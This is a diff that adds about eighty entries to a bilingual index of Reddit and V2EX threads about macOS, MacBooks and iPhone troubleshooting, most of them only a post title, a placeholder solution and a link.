@@ -2,7 +2,7 @@
 
 **🔙 [返回总索引](index.md) | [Back to Index](index.md)**
 
-**总计条目 / Total entries: 1794**
+**总计条目 / Total entries: 1896**
 
 > 技术细节（问题描述、解决方案等）保留原始语言以确保准确性，结构性文本提供中英双语。
 > Technical details (descriptions, solutions) remain in original language for accuracy; structural text is bilingual.
@@ -27529,5 +27529,1331 @@ See V2EX thread for community solutions.
 
 **参考链接 / References**:
 - https://www.v2ex.com/t/1212429#reply4
+
+---
+
+#### 1795. I somehow found the old Aqua Mac OS interface in seqouia 😭
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tev1rf/i_somehow_found_the_old_aqua_mac_os_interface_in/
+
+---
+
+#### 1796. Why doesn't macOS have per-app volume control? I didn
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tezpyq/why_doesnt_macos_have_perapp_volume_control_i_didn/
+
+---
+
+#### 1797. Hot take from a former Tahoe hater: I like it now
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1teyagn/hot_take_from_a_former_tahoe_hater_i_like_it_now/
+
+---
+
+#### 1798. Muffle - Blur everything except the active window
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tertt4/muffle_blur_everything_except_the_active_window/
+
+---
+
+#### 1799. I built a free app to reposition macOS notifications because every existing solution broke on Tahoe
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf4jfo/i_built_a_free_app_to_reposition_macos/
+
+---
+
+#### 1800. Sharing my free local music player
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tevke2/sharing_my_free_local_music_player/
+
+---
+
+#### 1801. Free and open source replacement for Target Display Mode — use your Intel iMac as an external display for Apple Silicon Macs
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1teqvr7/free_and_open_source_replacement_for_target/
+
+---
+
+#### 1802. How to prevent disk ejection warnings?
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1teovc8/how_to_prevent_disk_ejection_warnings/
+
+---
+
+#### 1803. Photos app taking up 72 gb??
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf0za8/photos_app_taking_up_72_gb/
+
+---
+
+#### 1804. Macbook M4 limited warranty isn’t 1 year
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf6d4n/macbook_m4_limited_warranty_isnt_1_year/
+
+---
+
+#### 1805. Hush: macOS focus & screen sharing tool. Big 2.0+ update.
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1ter751/hush_macos_focus_screen_sharing_tool_big_20_update/
+
+---
+
+#### 1806. New seamless way to snap windows on Mac with MacsyZones 3.0
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tensqb/new_seamless_way_to_snap_windows_on_mac_with/
+
+---
+
+#### 1807. SideNotes 1.6 is out: quick side notes on Mac, now with folding, pinning, quick formatting, redesigned Settings, and more
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1teosr9/sidenotes_16_is_out_quick_side_notes_on_mac_now/
+
+---
+
+#### 1808. I've had this running for months and I forget it's even there until someone asks about it
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1teqwuk/ive_had_this_running_for_months_and_i_forget_its/
+
+---
+
+#### 1809. MacPulse - Your system explained
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tetlae/macpulse_your_system_explained/
+
+---
+
+#### 1810. I made a Mac notch control centre, for Macs without notches
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf6p4q/i_made_a_mac_notch_control_centre_for_macs/
+
+---
+
+#### 1811. Can you lower the master/"global" audio volume sent to a sound device?
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tewy9y/can_you_lower_the_masterglobal_audio_volume_sent/
+
+---
+
+#### 1812. Aerial 4 - Free/Open source macOS screensaver finally compatible with Tahoe + smart video wallpaper
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1teswnp/aerial_4_freeopen_source_macos_screensaver/
+
+---
+
+#### 1813. Bug in Preview: .jpg or .jpeg based on a single or multiple images are exported
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf225d/bug_in_preview_jpg_or_jpeg_based_on_a_single_or/
+
+---
+
+#### 1814. Tiny open-source service that keeps external monitor brightness in sync with the internal one
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf1ph4/tiny_opensource_service_that_keeps_external/
+
+---
+
+#### 1815. Question about importing RAWs in Lightroom (beginner with Mac)
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf12bg/question_about_importing_raws_in_lightroom/
+
+---
+
+#### 1816. Mac Messages app refusing to send SMS to ONE specific contact? Works fine on iPhone/iPad.
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf0e6u/mac_messages_app_refusing_to_send_sms_to_one/
+
+---
+
+#### 1817. Standro, a $2.99 menu bar app that reminds you to stand up. Honest pros and cons inside.
+
+**问题描述 / Problem Description**:
+Reddit r/macos discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/MacOS/comments/1tf5ao8/standro_a_299_menu_bar_app_that_reminds_you_to/
+
+---
+
+#### 1818. iPhone 17 Pro Named Fastest-Charging Smartphone
+
+**问题描述 / Problem Description**:
+Reddit r/apple discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/apple/comments/1tejl06/iphone_17_pro_named_fastestcharging_smartphone/
+
+---
+
+#### 1819. Apple and Epic submit proposal for 5-month process to determine commission on 3rd party payments in apps
+
+**问题描述 / Problem Description**:
+Reddit r/apple discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/apple/comments/1teglf6/apple_and_epic_submit_proposal_for_5month_process/
+
+---
+
+#### 1820. A game changer for color grading
+
+**问题描述 / Problem Description**:
+Reddit r/apple discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/apple/comments/1tebnlc/a_game_changer_for_color_grading/
+
+---
+
+#### 1821. Apple MacBook Neo Review: A Brilliant Budget Laptop... But How Well Does It Game? - Digital Foundry
+
+**问题描述 / Problem Description**:
+Reddit r/apple discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/apple/comments/1tey2fb/apple_macbook_neo_review_a_brilliant_budget/
+
+---
+
+#### 1822. Cats Lock: Lock your Mac keyboard so your cat can walk on it
+
+**问题描述 / Problem Description**:
+Reddit r/apple discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/apple/comments/1tex55d/cats_lock_lock_your_mac_keyboard_so_your_cat_can/
+
+---
+
+#### 1823. An M2 air or a MacBook Neo
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf027c/an_m2_air_or_a_macbook_neo/
+
+---
+
+#### 1824. M5 Pro, 48GB RAM, Space Black! It’s beautiful, first personal Mac!
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tetgym/m5_pro_48gb_ram_space_black_its_beautiful_first/
+
+---
+
+#### 1825. First MacBook
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1teh6p3/first_macbook/
+
+---
+
+#### 1826. first MacBook
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tesl30/first_macbook/
+
+---
+
+#### 1827. After saving up for a year, finally got the MacBook of my dreams and needs
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tex80n/after_saving_up_for_a_year_finally_got_the/
+
+---
+
+#### 1828. Batterie charging and draining
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tep0m7/batterie_charging_and_draining/
+
+---
+
+#### 1829. Tough enough?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf69su/tough_enough/
+
+---
+
+#### 1830. Is MacBook Air as durable as Pro?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf63p2/is_macbook_air_as_durable_as_pro/
+
+---
+
+#### 1831. MBPro m5pro 48gb 1tb BTO delivery time
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf5ltc/mbpro_m5pro_48gb_1tb_bto_delivery_time/
+
+---
+
+#### 1832. First MacBook Pro in 7 Years
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf1im1/first_macbook_pro_in_7_years/
+
+---
+
+#### 1833. Mac air m1 speakers are better than my air m5😭
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf43u6/mac_air_m1_speakers_are_better_than_my_air_m5/
+
+---
+
+#### 1834. I tried using a Macbook for the first time in my life
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf6cpk/i_tried_using_a_macbook_for_the_first_time_in_my/
+
+---
+
+#### 1835. Buying a M1 MacBook Pro in 2026?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf5igx/buying_a_m1_macbook_pro_in_2026/
+
+---
+
+#### 1836. As a teacher, what laptop should I get? A brand new Macbook Neo or A 2hand 99% Macbook Air M2 8GB?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tequ8e/as_a_teacher_what_laptop_should_i_get_a_brand_new/
+
+---
+
+#### 1837. Any downsides to Macbook Pro over a Mini?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf3pwj/any_downsides_to_macbook_pro_over_a_mini/
+
+---
+
+#### 1838. M5 Air Vs Pro ?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tf32oc/m5_air_vs_pro/
+
+---
+
+#### 1839. First MacBook just came in
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tec0rf/first_macbook_just_came_in/
+
+---
+
+#### 1840. How true is it to avoid the 1st gen redesign of a MacBook?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tevz5b/how_true_is_it_to_avoid_the_1st_gen_redesign_of_a/
+
+---
+
+#### 1841. Help with desktop customization
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1teyrnz/help_with_desktop_customization/
+
+---
+
+#### 1842. Screen protector, microfiber cloth, skin/case for MacBook Neo?
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1texqik/screen_protector_microfiber_cloth_skincase_for/
+
+---
+
+#### 1843. need advice on purchasing macbook
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tex0ut/need_advice_on_purchasing_macbook/
+
+---
+
+#### 1844. learning on a MacBook
+
+**问题描述 / Problem Description**:
+Reddit r/macbook discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/macbook/comments/1tewq7i/learning_on_a_macbook/
+
+---
+
+#### 1845. External display not connecting/menu bar issue
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tewacu/external_display_not_connectingmenu_bar_issue/
+
+---
+
+#### 1846. Phone stolen in 2022. Now I'm getting an Activation Lock Email?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1teowyo/phone_stolen_in_2022_now_im_getting_an_activation/
+
+---
+
+#### 1847. My iPhone says it doesn't have enough storage to restore a backup
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf1tyd/my_iphone_says_it_doesnt_have_enough_storage_to/
+
+---
+
+#### 1848. Apple Pencil pro battery- does being constantly attached to the iPad damage health?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf5mvv/apple_pencil_pro_battery_does_being_constantly/
+
+---
+
+#### 1849. Found my old iPad and this is what it says.
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf5msn/found_my_old_ipad_and_this_is_what_it_says/
+
+---
+
+#### 1850. Is there any way to transfer messages from android to iPhone?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf5ksd/is_there_any_way_to_transfer_messages_from/
+
+---
+
+#### 1851. Quick start suck in a loop
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf55fk/quick_start_suck_in_a_loop/
+
+---
+
+#### 1852. How the fck do I transfer my WhatsApp chats 😭😭
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf51xb/how_the_fck_do_i_transfer_my_whatsapp_chats/
+
+---
+
+#### 1853. My MacBook Air isn't letting me connect to the internet 😭
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tevh2d/my_macbook_air_isnt_letting_me_connect_to_the/
+
+---
+
+#### 1854. Apple Store pickup pushed back to "tomorrow"
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tesx7e/apple_store_pickup_pushed_back_to_tomorrow/
+
+---
+
+#### 1855. Just upgraded from a iPhone 8 to a iPhone 16. Now all my old videos say “An Error Has Occurred While Loading a Quality Version Of This Video”
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1teyloh/just_upgraded_from_a_iphone_8_to_a_iphone_16_now/
+
+---
+
+#### 1856. Will the AppleStore be able to fix my 2018 MacBook Air?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf452p/will_the_applestore_be_able_to_fix_my_2018/
+
+---
+
+#### 1857. is dolby 5.1 possible with the airport express 2nd gen via mini toslink cable to my receiver?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1texpm4/is_dolby_51_possible_with_the_airport_express_2nd/
+
+---
+
+#### 1858. Camera app missing on iPhone 16e, iPad 9, and iPhone 11 - completely disappeared from settings ios26.5
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf3lpa/camera_app_missing_on_iphone_16e_ipad_9_and/
+
+---
+
+#### 1859. Flipping finally….
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf3ieu/flipping_finally/
+
+---
+
+#### 1860. Iphone 13 issue or only me?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf3fk4/iphone_13_issue_or_only_me/
+
+---
+
+#### 1861. ipad turning to restore
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf2sqq/ipad_turning_to_restore/
+
+---
+
+#### 1862. Nfc chip not working anymore (iphone 13) since ios 26
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf2msg/nfc_chip_not_working_anymore_iphone_13_since_ios/
+
+---
+
+#### 1863. iCloud storage issues
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tewbj5/icloud_storage_issues/
+
+---
+
+#### 1864. iPhone iOS Dictation Languages and Regional Dialect Doesn't Download
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tew7hc/iphone_ios_dictation_languages_and_regional/
+
+---
+
+#### 1865. Brand new iPhone air but Apple warranty already started months ago?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf1r2c/brand_new_iphone_air_but_apple_warranty_already/
+
+---
+
+#### 1866. MBA5 display issue after 1 month — service center says “liquid damage” even though there was no accident. Does this come under warranty?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tevgo5/mba5_display_issue_after_1_month_service_center/
+
+---
+
+#### 1867. Does Anyone know how to fix this
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf14w2/does_anyone_know_how_to_fix_this/
+
+---
+
+#### 1868. iPad battery draining fast and unable to update
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tev4ro/ipad_battery_draining_fast_and_unable_to_update/
+
+---
+
+#### 1869. My acoount hacked what to do?
+
+**问题描述 / Problem Description**:
+Reddit r/applehelp discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/applehelp/comments/1tf0w71/my_acoount_hacked_what_to_do/
+
+---
+
+#### 1870. [V2EX] 做了个 macOS 壁纸应用，想向大家征求一下意见或者建议。
+
+**问题描述 / Problem Description**:
+现在有点迷。身边的朋友确实会下载壁纸软件，有用付费的也有用免费的。 想问几个问题，不用正确回答，想说什么直接说，接受任何批评和意见。 一个月前，我来征求过意见，有人认为是伪需求，也真的有人加入了测试组。反正褒贬不一。所以经过了这段时间的优化再次向大家征求一下意见。做个调研。 你现在用的壁纸软件是什么？（免费还是付费？） 换壁纸频率大概多久？ 什么场景下会想换？ 现在的软件有什么让你不爽的地方？（找不到想要的？操作麻烦？广告？内容质量？） 假设要付费，什么功能/体验会让你掏钱？（具体点，比如"自动匹配桌面配色"、"某个特定风格的壁纸库"、"无广告纯净 体验"） 买断制 ¥38 vs 订阅制 ¥5
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213235#reply3
+
+---
+
+#### 1871. [V2EX] 做了一个 macOS Finder 右键增强工具： iRight，把常用文件操作放进右键菜单
+
+**问题描述 / Problem Description**:
+大家好，我最近做了一个 macOS 小工具：iRight ，也可以理解成 Super Right-Click 。 它的目标很简单：让 Finder 的右键菜单更好用一点。 我自己平时在 Mac 上处理文件时，经常会遇到一些很碎但高频的操作： 复制文件完整路径 新建文件 / 按剪贴板内容新建文件夹 HEIC 、PNG 、JPG 、WebP 等图片格式互转 压缩 / 解压 zip 、tar 、tar.gz 等文件 查看文件大小、哈希 视频转 GIF 生成 iOS / macOS / Watch iconset 给文件夹设置自定义图标 把图片上传到自己的图床 查看和复用剪贴板历史 这些事情单独看都不
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213192#reply7
+
+---
+
+#### 1872. [V2EX] N 年 1password 老用户，又续费了
+
+**问题描述 / Problem Description**:
+大概从 10 年前开始就在使用 1Password ，之前是一次性购买，后来转成订阅制之后又参与了多年优惠的活动，然后又以官方原价续费了一年。 今年由于涨价了，在账单日琢磨了一下有没有更便宜的购买方式。一开始有一个老哥给我推荐了一个日本代理商，三年优惠折合每年大概 180 元，后来发现淘宝上居然有商家一年只要 69 元 现在官方价格好像是 47 刀一年。要不是搜索了一下，直接就亏了好几百。说实话，我对密码管理器的预期是一年收个 100 多也就差不多了，再多的话我确实感觉有点贵了。 至于为什么不迁移到其他的密码管理 App ，一个是因为觉得麻烦，还有就是相对来说还是比较信任老牌厂商。现在有了 p
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213142#reply24
+
+---
+
+#### 1873. [V2EX] mac 频繁弹出““sudo”正在尝试以管理员身份执行命令。”，疑似 karabiner elements 导致的
+
+**问题描述 / Problem Description**:
+不知道是什么程序请求的，问 AI ，说让看日志，在日志里面找到弹窗要求管理员权限的时间，然后使用使用比如 log show --start "2026-04-22 19:17:29" --end "2026-04-22 19:17:31" 这样的命令来找到那个时间戳附近有什么别的程序的日志 排查结果就是弹窗要求 sudo 权限的附近是 karabiner elements 在写日志 不知道有没有遇到过类似问题的 v 友，如何解决？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213120#reply4
+
+---
+
+#### 1874. [V2EX] 同时支持垂直标签页的终端 app
+
+**问题描述 / Problem Description**:
+crTerm 148 for macOS 发布 这个是基于 chromium 定制的跨平台软件 下载地址 https://github.com/wuruxu/crterm/releases
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213110#reply1
+
+---
+
